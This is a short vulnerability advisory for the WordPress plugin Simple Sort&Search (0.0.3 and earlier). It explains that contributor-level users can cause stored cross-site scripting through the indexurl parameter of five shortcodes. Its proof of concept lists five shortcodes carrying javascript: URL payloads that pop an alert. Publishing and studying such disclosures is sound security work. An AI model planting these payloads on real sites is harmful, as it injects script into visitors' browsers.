## WordPress Plugin Vulnerabilities

# Simple Sort&Search <= 0.0.3 - Ccontributor+ Stored XSS

### Description

The plugin does not make sure that the indexurl parameter of the shortcodes "category\_sims", "order\_sims", "orderby\_sims", "period\_sims", and "tag\_sims" use allowed URL protocols, which can lead to stored cross-site scripting by users with a role as low as Contributor

### Proof of Concept

As a contributor, add one of the shortcode below to a post or page, then view it and change the state of the input/s generated (such as tick a checkbox, or select a different option etc) to trigger the XSS
[category\_sims type="checkbox" indexurl="javascript:alert(origin)//"]
[order\_sims indexurl="javascript:alert(origin)//"]
[orderby\_sims indexurl="javascript:alert(origin)//"]
[period\_sims indexurl="javascript:alert(origin)//"]
[tag\_sims type="checkbox" indexurl="javascript:alert(origin)//"]
